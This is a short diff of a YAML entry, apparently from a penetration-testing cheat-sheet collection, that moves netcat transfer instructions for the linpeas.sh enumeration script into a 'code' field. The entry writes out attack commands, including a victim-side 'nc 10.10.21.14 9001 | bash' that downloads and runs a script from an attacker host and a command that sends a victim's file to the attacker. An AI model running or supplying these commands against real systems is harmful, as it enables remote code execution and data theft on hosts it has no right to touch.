@@ -6,20 +6,20 @@ description: |
 
   	File to copy: linpeas.sh
 
-    Copy from attacker to victim:
-    
-    nc -lvnp 9001 < linpeas.sh (attacker) 
-    
-    nc 10.10.21.14 9001 | bash (victim)
-
-    Copy from victim to attacker:
-    
-    nc 10.10.21.14 9001 < file.txt (victim)
-    
-    nc -lvnp 9001 > file.txt (attacker)
-
 command: |
   nc -lvnp 9001 < linpeas.sh
+
+code: |
+  Copy from attacker to victim:  
+  nc -lvnp 9001 < linpeas.sh (attacker) 
+    
+  nc 10.10.21.14 9001 | bash (victim)
+
+  Copy from victim to attacker: 
+  nc 10.10.21.14 9001 < file.txt (victim)
+    
+  nc -lvnp 9001 > file.txt (attacker)
+
 items:
   - Shell
 services:
